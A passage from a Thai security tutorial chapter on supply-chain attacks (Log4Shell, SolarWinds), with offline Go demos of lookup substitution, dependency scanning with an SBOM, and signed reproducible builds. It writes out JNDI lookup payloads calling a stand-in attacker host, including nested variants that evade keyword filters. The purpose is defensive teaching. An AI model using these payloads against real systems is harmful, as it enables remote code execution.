- **D** — `${${lower:l}${lower:d}ap://attacker.example/a}` ซ้อนสองชั้น — ประกอบคำได้ทีละตัวอักษร

```
นโยบาย / payload                           |  A  B  C  D
----------------------------------------------------------------
VULN (Log4j 2.0-beta9–2.14.1)              |  0  1  1  1
WAF ไล่แบนคำ "ldap:","jndi:"               |  0  0  1  1
formatMsgNoLookups=true (มีตั้งแต่ 2.10.0) |  0  0  0  0
allowlist prefix (2.16.0+)                 |  0  0  0  0
escape ค่าจากผู้ใช้ + allowlist            |  0  0  0  0
(1 = โค้ดจากระยะไกลถูกสั่งให้ทำงาน = RCE · 0 = ไม่ทำงาน)
```

อ่านตารางนี้ช้า ๆ เพราะมันสรุปประวัติศาสตร์ทั้งหมดของ Log4Shell ไว้ใน 5 บรรทัด:

- **แถวที่ 1 (VULN = รุ่นที่ยังไม่แพตช์)** — payload ที่แฝง lookup (B, C, D) ทั้งหมด **ทำงาน** = RCE 3 กรณี · payload ปกติ (A) ไม่ทำอะไร
- **แถวที่ 2 (WAF ไล่แบนคำ)** — ตัวกรองแบบ "ไล่แบนคำ" จับ **payload คลาสสิก (B)** ได้ (เพราะข้อความดิบมีคำว่า `ldap:` อยู่ตรง ๆ) แต่ **payload ที่ถูกซ้อน (C, D) ผ่านไปได้** เพราะข้อความดิบไม่มีคำที่แบน — มันประกอบคำนั้นขึ้นมาใหม่ตอนขยาย
- **แถวที่ 3 (`formatMsgNoLookups=true`)** — มาตรการที่ปิด lookup บนข้อความ · property ตัวนี้มีอยู่ใน Log4j มา **ตั้งแต่รุ่น 2.10.0** แต่ค่าเริ่มต้นไม่ได้เปิด คนจึงต้องไปตั้งเอง — ในคืนเกิดเหตุ Log4j แนะนำให้ตั้งค่านี้เป็นการชั่วคราว → กันได้ทั้งหมด **ในเดโมนี้** แต่นี่คือมาตรการที่โจทย์ของมันแคบและถูกแทนที่ด้วยแถวที่ 4 ในที่สุด (เพราะของจริงก็พบว่าไม่ครอบคลุมทุกกรณี)
- **แถวที่ 4 (allowlist)** — ทางออกที่ถูกต้อง: อนุญาตแค่ `env` กับ `date` → prefix อื่นไม่ทำงาน ไม่ว่าจะเขียนยังไง
- **แถวที่ 5 (escape + allowlist)** — ชั้นที่แข็งที่สุด: **escape `$` ของค่าที่มาจากผู้ใช้** ทำให้ผู้ใช้ "สร้าง `${...}` ใหม่" ไม่ได้เลยตั้งแต่ต้น

มาดูกรณีจริง (payload C กับ engine VULN) เพื่อให้เห็นว่า "ภัยมันเงียบแค่ไหน":

```
--- ตัวอย่างจริง: VULN engine กับ payload C ---
input    : login ok user=${${lower:l}dap://attacker.example/a}
rendered : login ok user=[REMOTE-CLASS-EXECUTED://attacker.example/a]
trace    : [jndi->ldap //attacker.example/a]
log_looks_normal=1 (ข้อความออกมาปกติทุกอย่าง — ไม่มี error ไม่มี crash)
```

สังเกตว่าในบรรทัด `rendered` คำว่า `ldap` หายไป เหลือแค่ `//attacker.example/a` — เพราะโค้ดพิมพ์เฉพาะ `key` ที่ได้หลังตัด prefix (`ldap:`) ออกจากข้อความแล้ว (ดู `cutPrefix` ใน `subst/subst.go`)

`log_looks_normal=1` คือบรรทัดที่ต้องจำ: **โปรแกรมไม่ได้แจ้งเตือนอะไรเลย** · ข้อความ log ออกมาปกติ ไม่มี error ไม่มี crash — ทั้งที่ในเบื้องหลัง "โค้ดจากระยะไกลถูกสั่งให้ทำงานแล้ว"

และนี่คือทางออกที่ถูกต้อง พร้อมข้อพิสูจน์ว่า **lookup ที่เชื่อถือได้ยังทำงานได้ปกติ** (เราไม่ได้ปิดฟีเจอร์ทิ้ง — เราแค่จำกัดว่าอะไรทำได้):

```
--- เทียบ: escape ค่าจากผู้ใช้ ---
untrusted (escape แล้ว): login ok user=$${$${lower:l}dap://attacker.example/a}
rendered : login ok user=${${lower:l}dap://attacker.example/a}
remote_code_executed=0
trusted_config_lookup="${env:APP_NAME}" -> havebit-web (lookup ที่เชื่อถือได้ยังทำงาน)
network_connections=0 (ไม่มีไฟล์ใด import แพ็กเกจเครือข่ายเลย — resolver ldap เป็นของจำลอง)
```

ทำไม `$$` จึงกันได้ — เพราะ Log4j ตีความ `$$` เป็นตัวอักษร `$` ตัวเดียว (escape) แล้ว "ไม่ขยาย" ต่อ · พอค่าจากผู้ใช้ผ่านการ escape ก่อน ข้อความที่เก็บจริงจึงกลายเป็น `${...}` ที่ไม่มีวันถูกตีความเป็น lookup

**`remote_code_executed=0`** คือผลลัพธ์ที่เราต้องการ · และ `${env:APP_NAME}` ที่ framework เป็นคนใส่ (ไม่ใช่ผู้ใช้) ยังถูกขยายเป็น `havebit-web` ตามปกติ → **เราไม่ได้ปิดฟีเจอร์ทิ้ง แต่จำกัดว่าฟีเจอร์นั้นทำงานได้กับข้อมูลที่มาจาก "เรา" เท่านั้น** · นี่คือความหมายของ allowlist + escape ที่ต่างจากการแบนคำแบบเหมารวม

### 3.2 เดโม 2: dependency scan + SBOM — เห็นของที่มองไม่เห็น

ทีนี้มาถึงคำถามว่า *"dependency ที่เราไม่รู้ว่ามี ตรวจได้ยังไง"* — และนี่คือตัวที่ตอบโจทย์ของเราได้ตรง ๆ · เราสร้าง dependency graph จริงของแอปหนึ่ง ที่มี **2 ตัวที่ทีมระบุเอง** และ **3 ตัวที่ถูกดึงต่อ** — โดยไม่มีตัวไหนเลยที่ชื่อ log4j อยู่ในลิสต์ที่ทีมเลือก

ตัว scanner เองคือการเทียบ version กับช่วง `[intro, fixed)`:

```go
// Scan = เทียบทุก component กับฐานข้อมูล คืนรายการที่มีช่องโหว่
func Scan(comps []Component, advs []Advisory) []Vulnerable {
	var out []Vulnerable
	for _, c := range comps {
		for _, a := range advs {
			if c.Name != a.Module {
				continue
			}
			if inRange(c.Version, a.Intro, a.Fixed) {
				out = append(out, Vulnerable{Component: c, Advisory: a})
			}
		}
	}
	// เรียงผลให้คงที่ทุกครั้ง: ชื่อ component ก่อน แล้วค่อยรหัส advisory (CVE)
	// ไม่เรียง = ลำดับผลลัพธ์ขึ้นกับลำดับใน slice → รันซ้ำได้ไฟล์ out/ ไม่เหมือนเดิม
	sort.Slice(out, func(i, j int) bool {
		if out[i].Component.Name != out[j].Component.Name {
			return out[i].Component.Name < out[j].Component.Name
		}
		return out[i].Advisory.ID < out[j].Advisory.ID
	})
	return out
}
```

```
บทเรียน: SBOM ทำให้ dependency ที่ 'มองไม่เห็น' ปรากฏก่อนที่ช่องโหว่จะถูกใช้
```

หมายเหตุเชิงปฏิบัติ: เครื่องมือ **จริง** ที่ทำงานแบบนี้ในโลก Go คือ **govulncheck** ที่ดึงข้อมูลจาก **Go vulnerability database** (`vuln.go.dev`) ซึ่งเก็บข้อมูลในรูปแบบ **OSV** · จุดที่ govulncheck ดีกว่า scanner ทั่วไปคือมัน **_วิเคราะห์ call graph_** (ว่าฟังก์ชันที่มีช่องโหว่ถูกเรียกใช้จริงหรือไม่) → ลด false positive (การเตือนที่ผิด — บอกว่ามีช่องโหว่ ทั้งที่โค้ดเราไม่ได้เรียกใช้ส่วนนั้น) ได้มาก (ติดตั้ง: `go install golang.org/x/vuln/cmd/govulncheck@latest` แล้วรัน `govulncheck ./...` จากโฟลเดอร์โมดูล) · แต่ในเดโมนี้เราเขียน scanner เองแบบออฟไลน์ stdlib ล้วน **เพื่อให้เห็น mechanism ชัด ๆ ว่า "เทียบเวอร์ชันกับ advisory" ทำงานยังไง** ไม่ใช่เพื่อแทน govulncheck

### 3.3 เดโม 3: signed artifact + reproducible build — เมื่อ "ลายเซ็นถูกต้อง" ยังไม่พอ

นี่คือส่วนที่ยากที่สุดของ SolarWinds และสำคัญที่สุด · ในเดโม 3 เราสร้าง artifact ขึ้นมา, เซ็นด้วยคีย์แบบ **ed25519** (อัลกอริทึมลายเซ็นดิจิทัลแบบ public-key ที่คีย์สั้นและเซ็นเร็ว), แล้วดูว่าเกิดอะไรขึ้นใน 4 กรณี

`go.mod` ของตอนนี้ไม่มี dependency ภายนอกเลย:

```text
module ep08supplychain

go 1.24
```

การสร้าง artifact และการเซ็น/ตรวจ — ทั้งหมดเป็น standard library:

```go
// buildWith = ประกอบ "ไบต์ของ artifact" ขึ้นมาใหม่ (จำลองไฟล์ที่คอมไพล์เสร็จ)
// ลำดับส่วน: ส่วนหัว (ELF-demo + metadata + hash ของ source) → ส่วน code → ส่วน data
// injected != nil = มีไบต์โค้ดถูกแทรกเข้ามาตอนคอมไพล์ (build server ถูกยึด — แบบ SUNSPOT)
func buildWith(injected []byte) []byte {
	out := []byte("ELF-demo\x00app=havebit-web\x00version=1.4.0\x00src=" + SourceDigest + "\x00")
	out = append(out, []byte("text\x00...compiled code...\x00")...)
	if injected != nil {
		out = append(out, injected...)
	}
	out = append(out, []byte("\x00data\x00...\x00")...)
	return out
}
```

`SourceDigest` ที่โผล่ในบรรทัดแรกคือ **ค่าคงที่ที่จำลอง "hash ของ source ที่ถูกบิลด์"** — ของจริงคือ commit SHA หรือ hash ของ source tree ทั้งต้น · เราตรึงมันไว้เป็นค่าเดียว เพื่อให้บิลด์จาก source เดิมได้ไบต์เดิม (และ hash เดิม) ทุกครั้ง · ส่วน `injected` คือไบต์โค้ดที่จะถูกแทรกเข้ามาตอนคอมไพล์ — เป็น `nil` ในบิลด์ปกติ และไม่ใช่ `nil` ในบิลด์ที่ build server ถูกยึด

```go
// Sign = เซ็น artifact ด้วยคีย์ของผู้ขาย (คืนลายเซ็นเป็น hex)
func Sign(artifact []byte) string {
	return hex.EncodeToString(ed25519.Sign(demoKey(), artifact))
}

// Verify = ตรวจลายเซ็น: true = ลายเซ็นถูกต้องและไบต์ไม่ถูกแก้หลังเซ็น
func Verify(artifact []byte, sigHex string) bool {
	sig, err := hex.DecodeString(sigHex)
	if err != nil || len(sig) != ed25519.SignatureSize {
		return false
	}
	pub := demoKey().Public().(ed25519.PublicKey)
	return ed25519.Verify(pub, artifact, sig)
}
```

รันจริงทั้งสี่กรณี:

```
artifact1_bytes=150  sha256=061ee8bbb6754568d7483c94d73f35180127abaf1e9bb4a01b5388e07e5fcbbe
signature_valid=true  signed_by_vendor=1 (ลายเซ็นถูกต้อง — พิสูจน์ว่า 'ใครเซ็น' ไม่ใช่ 'บิลด์สะอาด')

--- แก้ 1 ไบต์หลังเซ็น (การแก้ระหว่างทาง) ---
tampered_sha256=7e16399d0317f9f167b5c74a18697d30aacebf1020813a2709c96f5a2a29edcb
tampered_signature_valid=false

--- reproducible build: บิลด์จาก source เดิมสองครั้ง ---
build1_sha256=061ee8bbb6754568d7483c94d73f35180127abaf1e9bb4a01b5388e07e5fcbbe
build2_sha256=061ee8bbb6754568d7483c94d73f35180127abaf1e9bb4a01b5388e07e5fcbbe
reproducible_match=true

--- build server ถูกยึด: แทรกโค้ดระหว่างคอมไพล์ (SUNSPOT) ---
build_server_injected_backdoor=1
tampered_artifact_sha256=0426ed92d402c1277df23ed92645a0a508110544aa9a70d79854fe68dd476d61
different_from_clean_build=true
signature_valid=true  signed_by_vendor=1 (ลายเซ็นถูกต้อง — พิสูจน์ว่า 'ใครเซ็น' ไม่ใช่ 'บิลด์สะอาด')
บทเรียน: ลายเซ็นถูกต้อง แต่บิลด์ไม่สะอาด — เซ็นอย่างเดียวจับ 'build server ที่ถูกยึด' ไม่ได้
          ต้องมี reproducible build: บิลด์ซ้ำจาก source เดิม ต้องได้ hash เดิม (จึงเทียบได้)
```

อ่านสี่กรณีนี้ให้ครบ:

- **กรณี 1 (เซ็น + ตรวจ)** — ลายเซ็นผ่าน → `signed_by_vendor=1` คือ "ของนี้คือของจริงจากผู้ขายจริง"
- **กรณี 2 (แก้ 1 ไบต์หลังเซ็น)** — `tampered_signature_valid=false` → **ลายเซ็นจับการแก้ระหว่างทางได้** (นี่คือสิ่งที่ลายเซ็นทำได้ดี)
- **กรณี 3 (reproducible build)** — บิลด์จาก source เดิมสองครั้ง ได้ `sha256` **เหมือนกันเป๊ะ** → `reproducible_match=true` = เรามี "ค่าอ้างอิงที่คาดหวังได้" ของบิลด์ที่สะอาด
- **กรณี 4 (build server ถูกยึด)** — กรณีนี้คือ **SolarWinds** เป๊ะ ๆ: โค้ดถูกแทรก **ระหว่างคอมไพล์** (เหมือน SUNSPOT) → บิลด์ไม่สะอาด แต่ **`signature_valid=true`**!

**`signature_valid=true` ในกรณี 4 คือบทเรียนที่สำคัญที่สุดของตอนนี้** · ลายเซ็นถูกต้อง 100% เพราะผู้โจมตีเข้าไปถึง **คีย์เซ็น/เครื่อง build ของผู้ขาย** — ลายเซ็นพิสูจน์ว่า *"ใครเซ็น"* ไม่ได้พิสูจน์ว่า *"บิลด์สะอาด"* · และกรณี 3 คือสิ่งที่ช่วยเรา: **ถ้าเรามี "hash ที่ควรจะเป็น" ของบิลด์ที่สะอาด (จาก reproducible build) เราก็เทียบได้** ว่าบิลด์ที่ได้รับมามีไบต์แปลกปลอมหรือเปล่า

นี่คือเหตุผลที่ SLSA/sigstore เน้นคำว่า **provenance** (ที่มา) ไม่ใช่แค่ signature (ลายเซ็น) · เพราะ "ลายเซ็น" ตอบคำถามว่า **ใคร** · แต่ provenance + reproducible build ตอบคำถามว่า **สร้างมาอย่างไร และจาก source อะไร**

### 3.4 อ่านตารางป้องกันเป็นชั้น

การป้องกัน supply chain จึงไม่ใช่มาตรการเดียว แต่เป็นชั้น ๆ ที่แต่ละชั้นจับ "ภัยคนละแบบ":

![หกชั้นป้องกัน supply chain: จาก SBOM ถึง least privilege](/assets/diagrams/ep08-03-supply-chain-defenses.svg)

| ชั้น | จับภัยอะไร | เดโมของเราแสดงว่า |
|---|---|---|
| 1. SBOM | "ไม่รู้ว่ามีอะไรอยู่ในระบบ" | `total_components=5` · เห็น `log4j-core` ที่ไม่เคยอยู่ในลิสต์ |
| 2. Dependency scanning | "ของที่รู้ว่ามี มีช่องโหว่หรือยัง" | `vulnerable_components=2` → pin แล้วเหลือ 0 |
| 3. Pin + lockfile | "ของเปลี่ยนเองโดยไม่ตั้งใจ" | อัปเกรดเป็น 2.17.1 แล้วสแกนใหม่ → `vulnerable_components=0` |
| 4. Signed artifact + provenance | "ของถูกปลอม/ถูกสลับระหว่างทาง" | `tampered_signature_valid=false` จับการแก้หลังเซ็น |
| 5. Reproducible build | **"build server ที่ถูกยึด"** | `signature_valid=true` แต่ `different_from_clean_build=true` |
| 6. Least privilege + egress | "ถ้าชั้นบนพัง ความเสียหายแค่ไหน" | เดโมของเราไม่เปิดเครือข่ายเลย (`net_package_imports=0`) |

**Least privilege** (ให้สิทธิ์น้อยที่สุดเท่าที่งานนั้นต้องใช้) และ **egress filtering** (จำกัดว่าซอฟต์แวร์ของเราออกไปหาใครบนเครือข่ายได้บ้าง) เป็นชั้นที่ "ไม่ต้องรู้จักช่องโหว่" ก็ทำงานได้ — ต่อให้ชั้นอื่นพลาด มันก็ยังจำกัดความเสียหายไว้ได้

และในโลกจริง ชั้น 6 คือสิ่งที่ Log4Shell สอนแบบตรง ๆ: **ถ้าแอปออกไป LDAP ผ่านพอร์ต 389/636 ไม่ได้ ก็ต่อให้ผู้โจมตีส่ง `${jndi:...}` เข้ามาสำเร็จ มันก็ไปดึง class ไม่ได้** — นี่คือเหตุผลที่คำแนะนำเรื่อง **egress filtering** ถูกพูดถึงในคืนเกิดเหตุร่วมกับการแพตช์

## 4. บทเรียน: โลกทำอะไรกับสองเหตุการณ์นี้

### 4.1 หกบทเรียนที่เอาไปใช้ได้พรุ่งนี้

1. **"โค้ดของเรา" กับ "โค้ดที่เราใช้" เป็นคนละขอบเขตความเชื่อถือ** — ทุก dependency, toolchain และ build pipeline อยู่ *นอก* ขอบเขตที่เราเขียนเอง แต่ *ใน* ขอบเขตที่เราต้องรับผิดชอบ · attack surface = ทุกอย่างที่รันในนามของเรา
2. **"โจมตีคนที่เราไว้ใจ" ถูกกว่าการเจาะเรามาก — สำหรับผู้โจมตี** — Log4Shell: ยิงครั้งเดียวได้ทุกคน · SolarWinds: อัปเดตครั้งเดียวถึง 18,000 องค์กร · เพราะฉะนั้นผู้โจมตีจึงมีแรงจูงใจมหาศาลที่จะไปโจมตี "ต้นน้ำ"
3. **แบนคำ (denylist) ไม่พอ — ต้อง allowlist** — ในเดโม 1 แถว WAF จับ payload คลาสสิกได้ แต่ปล่อย payload ที่ซ้อนผ่านไป (C, D = 1) · เพราะผู้โจมตีประกอบคำใหม่ได้ตอน runtime · allowlist ของ prefix ปิดทางนี้ได้ทั้งหมด
4. **"อัปเดตเป็นเวอร์ชันใหม่กว่า" ไม่ได้แปลว่า "ปลอดภัย"** — 2.15.0 ใหม่กว่า 2.14.1 แต่ยังติด CVE-2021-45046 · ต้องอ่าน advisory ให้ครบว่า "แก้แล้วในรุ่นไหน" และ "รุ่นที่ปลอดภัยจริงคือรุ่นไหน"
5. **ลายเซ็นพิสูจน์ "ใคร" ไม่ได้พิสูจน์ "ความสะอาด"** — เดโม 3 กรณี 4: `signature_valid=true` แต่บิลด์มี backdoor · SolarWinds พิสูจน์เรื่องนี้ในระดับ 18,000 องค์กร · ต้องมี **provenance + reproducible build** มาช่วย (SLSA/cosign/in-toto)
6. **ต้อง "รู้ว่ามีอะไรในระบบ" ก่อนจะป้องกันได้** — เดโม 2: `log4j_core_declared_directly=false` แต่ `vulnerable_components=2` · ภัยอยู่ในระบบเราโดยที่เราไม่รู้ · SBOM คือขั้นแรกที่ทำให้สิ่งนั้น *มองเห็นได้*

### 4.2 เครื่องมือจริงที่ควรรู้จัก (ไม่ใช่ของในเดโม)

เดโมของเราเป็น "ของจำลอง" เพื่อให้เห็น mechanism · เครื่องมือจริงที่ควรใช้ในงาน:

- **govulncheck** (Go) — dependency scanning ที่วิเคราะห์ call graph · `go install golang.org/x/vuln/cmd/govulncheck@latest` แล้ว `govulncheck ./...` · ดึงข้อมูลจาก `vuln.go.dev` ในรูปแบบ OSV
- **Dependabot** (GitHub) — แจ้งเตือน + เปิด PR อัปเดต dependency ให้อัตโนมัติ
- **OSV** (Open Source Vulnerabilities) — ฐานข้อมูลกลางที่หลายเครื่องมือใช้ร่วมกัน
- **SLSA** — กรอบงานระดับความเชื่อมั่นของ provenance (artifact นี้สร้างจาก source อะไร บน build platform แบบไหน)
- **Sigstore / cosign** — เซ็นและตรวจ artifact (ใช้ OIDC แทนคีย์ถาวร) และเก็บลง transparency log (Rekor)
- **NTIA SBOM minimum elements + CISA** — ขั้นต่ำของ SBOM ที่หน่วยงานรัฐสหรัฐกำหนดให้ส่งได้

และหลักคิดที่ครอบทุกเครื่องมือนี้: **"trust but verify" (ไว้ใจได้ แต่ต้องตรวจสอบได้เสมอ)** — เราไม่จำเป็นต้องไม่ไว้ใจคู่ค้า · แต่ต้องมี **วิธีตรวจสอบ** ที่ไม่ต้องพึ่งคำพูดของใคร

## 5. โจทย์ประจำตอน

### ระดับ Drill (5–10 นาที)

1. **อธิบายด้วยคำของคุณเอง** ว่าทำไมในเดโม 1 แถว "WAF ไล่แบนคำ" จึงจับ payload B ได้ แต่ปล่อย payload C ผ่านไป · คำตอบต้องพูดถึงคำว่า "ข้อความดิบ" กับ "การขยายซ้อน" และทำไมผู้โจมตีถึงชอบวิธีนี้
2. **คำนวณจากผลรัน** — ในเดโม 1 มี payload 4 แบบ × นโยบาย 5 แบบ:
   (ก) นโยบายแบบ VULN ให้ `remote_code=1` กี่ครั้ง (นับจากช่องผลลัพธ์)
   (ข) แถว WAF จับได้กี่ครั้งจากทั้งหมดกี่ครั้งที่เป็นภัยจริง (คิดเป็นอัตราส่วน)
   (ค) เพราะเหตุใดแถว `formatMsgNoLookups` กับแถว `allowlist` ให้ผลเท่ากัน *ในเดโมนี้* — แต่ในโลกจริง มาตรการแรกถูกมองว่าไม่พอ · อธิบายความต่างเชิง "ขอบเขต" (scope) ไม่ใช่เชิงผลลัพธ์
3. **ตอบจากเดโม 2** — `log4j_core_declared_directly=false` แปลว่าอะไร · และเพราะเหตุใด "ทีมไม่ได้เลือก dependency ตัวนี้เอง" จึงทำให้ความเสี่ยง *สูงขึ้น* ไม่ใช่ต่ำลง
4. **แก้โค้ดให้ถูกต้อง** — ใน `subst/subst.go` ให้เพิ่ม resolver ตัวใหม่ที่ชื่อ `file` (อ่านไฟล์ในเครื่อง) แล้วกำหนดนโยบายให้ **เฉพาะ resolver นี้** ที่ยังทำงานได้แม้อยู่ในโหมด allowlist · จากนั้นอธิบายว่าเพราะเหตุใดการเพิ่ม resolver ใหม่ = การเพิ่ม attack surface และควรทำเฉพาะเมื่อจำเป็นจริง ๆ
5. **จากเดโม 3 กรณี 4:** ถ้าลายเซ็นถูกต้อง 100% แล้วเราจะรู้ได้อย่างไรว่าไบต์ที่ได้มามีอะไรแปลกปลอม · เขียนอัลกอริทึม 5 บรรทัด (ภาษาธรรมชาติหรือ pseudocode ก็ได้) ที่ใช้ `reproducible build` เพื่อตอบคำถามนี้ — ต้องมีคำว่า "hash ที่ควรจะเป็น" และ "ได้จาก build ของเราเองจาก source ที่เราเชื่อ"
6. **ตอบจากหัวข้อ 2.3** — เพราะเหตุใดการป้องกัน Log4Shell จึงเป็นสิ่งที่ "เรา" ทำได้เองเกือบทั้งหมด แต่การป้องกัน SolarWinds ต้องพึ่งผู้ขาย (และผู้ใช้ตรวจสอบได้จำกัด) · เขียนเป็น 2–3 ประโยค

### ระดับ Mini-project (30–60 นาที)

1. **ทำ dependency scanner ให้ตรวจ dependency graph 3 ชั้น** — เขียนโปรแกรม Go ที่รับ dependency graph ที่มี **3 ชั้น** (direct → ตัวกลาง → ตัวที่ลึกที่สุด) แล้วรายงานว่า component ตัวไหนที่มีช่องโหว่ *พร้อมแสดงเส้นทาง dependency* ที่พาไปถึงมัน (เช่น `web-framework → logging-bridge → log4j-core`) · ใช้ advisory DB อย่างน้อย 3 รายการ (CVE-2021-44228, CVE-2021-45046, CVE-2021-45105) · ต้องผ่าน `go test ./...` และรันได้แบบออฟไลน์ · **ปิดท้ายด้วย 1 ย่อหน้า**: ทำไม "การเห็นเส้นทาง dependency" จึงมีค่ามากกว่าแค่ "เห็นรายชื่อ component"
2. **สร้าง SBOM ของโปรเจกต์จริงของคุณแล้วหาช่องโหว่** — เลือกโปรเจกต์ Go ของคุณ (หรือ open source ที่ build ได้) แล้ว
   (ก) สร้างรายการ component ทั้งหมด (เขียนเอง หรือใช้เครื่องมือ) แล้วนับ direct/transitive
   (ข) ค้นหาว่ามี dependency ตัวไหนที่ **คุณไม่เคยรู้ว่ามี** (เทียบกับลิสต์ที่คุณเข้าใจว่ามี)
   (ค) เขียนสั้น ๆ ว่า "ถ้า dependency ที่คุณเพิ่งพบว่ามีอยู่ ถูกยึดพรุ่งนี้ คุณจะรู้ตัวภายในกี่ชั่วโมง และรู้ได้อย่างไร"
3. **ทดลอง reproducible build** — เลือกโปรแกรม Go ขนาดเล็ก แล้วพยายามทำ build ให้ **ผลลัพธ์คงที่ (deterministic)** · รายงานอุปสรรคที่เจอ (เช่น timestamp, path ในเครื่อง, build ID) และวิธีแก้ที่ได้ผล · จากนั้นอธิบายว่า "ทำไม build ที่ไม่ reproducible จึงทำให้ตรวจ build server ที่ถูกยึดได้ยากขึ้น"
4. **วิเคราะห์เหตุการณ์จริงด้วยกรอบสามตำแหน่ง** — เลือกเหตุการณ์ supply chain จริง 1 เหตุการณ์ (เช่น event-stream 2018, codecov 2021, xz-utils 2024) แล้วเขียนตารางวิเคราะห์: เหตุการณ์นั้นอยู่ตำแหน่งใดในตารางหัวข้อ 1.2 · ผู้โจมตีทำอะไร · สัญญาณที่ "ควรจะจับได้" คืออะไร · และเครื่องมือในหัวข้อ 4.2 ตัวไหนจะช่วยได้จริง (อ้างจากแหล่งปัจจุบัน ไม่ใช่ความจำ)
5. **สำรวจสคริปต์ตรวจของตอนนี้** — เปิด `verify_article.py` แล้วอธิบายว่ามันตรวจอะไรบ้าง · แล้ว **หา 1 จุดที่มันยังตรวจไม่ได้** (เช่น "คำอธิบายในเนื้อความสอดคล้องกับผลรันไหม" หรือ "ตัวเลขที่ยกมาในตารางสรุปตรงกับ `out/` ไหม") แล้วเขียนเช็คของตัวเองเพิ่ม

## 6. สรุปตอนที่ 08

- **supply chain attack = โจมตี "คนที่เราไว้ใจ" แทนการเจาะตัวเรา** · attack surface จึงไม่ใช่แค่โค้ดของเรา แต่รวม **ทุก dependency, toolchain และ build pipeline** · สามตำแหน่งที่ต่างกัน (dependency ท้ายน้ำ / build pipeline ต้นน้ำ / toolchain-registry) แก้ไม่เหมือนกัน
- **Log4Shell (CVE-2021-44228 · CVSS 10.0)** — library log สำหรับ Java ที่ทุกคนใส่ แต่ไม่มีใครอ่าน · ช่องโหว่จาก **message lookup substitution**: `${jndi:ldap://...}` ในข้อความ log ที่มาจากผู้ใช้ → โหลดและเรียก Java class จาก LDAP ของผู้โจมตี = RCE · กระทบ **log4j-core 2.0-beta9 ถึง 2.14.1** · รายงานแบบส่วนตัว 24 พ.ย. 2021 (Chen Zhaojun, Alibaba Cloud) → เปิดเผย 9–10 ธ.ค. 2021 · **แก้ไม่จบในรุ่นเดียว:** 2.15.0 (10 ธ.ค.) แก้ไม่ครบ → 2.16.0 (14 ธ.ค.) ปิด message lookup + ปิด JNDI by default → 2.17.0 (18 ธ.ค.) → **2.17.1 (28–29 ธ.ค. 2021) = รุ่นที่ปลอดภัยจริงสำหรับ Java 8+** (Java 7 → 2.12.4 · Java 6 → 2.3.2)
- **SolarWinds / SUNBURST (2020)** — ผู้โจมตีเข้าถึงเครือข่าย SolarWinds กันยายน 2019 · ใช้ **SUNSPOT แทรกโค้ด "ก่อนคอมไพล์"** → source ใน repository ยังสะอาด, code review เห็นปกติ · บิลด์ที่ถูกแทรกถูก **เซ็นด้วยใบรับรองของ SolarWinds เอง** และแจกผ่านอัปเดตปกติ · แจ้งลูกค้า **~33,000 ราย** · น้อยกว่า **18,000 ราย** ที่ติดตั้งบิลด์ที่มี backdoor · ถูก "ลงมือเจาะต่อ" จริง **น้อยกว่า 100** รวม **9 หน่วยงานรัฐบาลกลางสหรัฐ** · เปิดเผยโดย **FireEye** 13 ธ.ค. 2020 · CISA ออก Emergency Directive 21-01 · เชื่อมโยง **APT29 / SVR**
- **เดโมของเราพิสูจน์ครบทั้งสามด้าน:**
  - **เดโม 1 (subst)** — payload ที่แฝง lookup ทำงาน 3 จาก 4 แบบในโหมด VULN · **ตัวกรองแบบไล่แบนคำจับได้แค่ payload คลาสสิก ปล่อย payload ที่ซ้อนผ่านไป** · แต่ **allowlist ของ prefix (และ escape ค่าจากผู้ใช้) ทำให้ `remote_code_executed=0` ทุก payload** โดย ${env:...} ที่เชื่อถือได้ยังทำงานปกติ
  - **เดโม 2 (deps)** — SBOM เปิดเผย component 5 ตัว (direct 2 / transitive 3) · `log4j_core_declared_directly=false` แต่ `vulnerable_components=2` · pin เป็น 2.17.1 แล้วเหลือ 0
  - **เดโม 3 (artifact)** — ลายเซ็นจับการแก้ไข 1 ไบต์ได้ (`tampered_signature_valid=false`) · reproducible build ได้ hash เดิมทั้งสองครั้ง (`reproducible_match=true`) · แต่ **build server ที่ถูกยึดให้ `signature_valid=true` พร้อม backdoor** → ลายเซ็นพิสูจน์ "ใครเซ็น" ไม่ได้พิสูจน์ "บิลด์สะอาด"
- **ผลลัพธ์เชิงนโยบาย:** SBOM (Executive Order 14028 · พ.ค. 2021 → NTIA minimum elements 12 ก.ค. 2021) · dependency scanning (govulncheck / Dependabot / OSV) · signed artifact + provenance (SLSA / sigstore-cosign / in-toto) · pinning version · egress filtering
- **คำถามที่ควรถามตัวเองก่อนปิดบทนี้:** *"ในระบบที่ฉันดูแล มี dependency ตัวไหนที่ฉันไม่รู้ว่ามีอยู่ และถ้ามันถูกยึดพรุ่งนี้ ฉันจะรู้ตัวภายในกี่ชั่วโมง?"* · และคำถามที่สอง: *"ลายเซ็นที่ฉันตรวจอยู่ พิสูจน์ว่า 'ใครเซ็น' หรือ 'บิลด์สะอาด'?"* สองคำถามนี้ครอบสาเหตุของ Log4Shell และ SolarWinds ไว้แล้ว

ตอนหน้า (ตอนที่ 09) เราจะขยับจากอดีตมาที่ **ภาพปัจจุบัน**: ransomware ที่กลายเป็นธุรกิจ, ตลาด zero-day, ระบบ bug bounty และคำถามว่า *ทำไมอาชีพด้าน security ถึงโตขึ้นทุกปี* — เพื่อเตรียม mindset ก่อนเข้าสู่ระยะที่ 2 (หลักคิด: threat modeling, least privilege, trust boundary)

ระหว่างรอ ลองเปิดไฟล์ dependency ของโปรเจกต์คุณแล้วถามว่า: *"มี component ตัวไหนที่ฉันไม่เคยตั้งใจเลือก แต่มันอยู่ในระบบฉัน?"* — นั่นคือโจทย์ของตอนหน้า
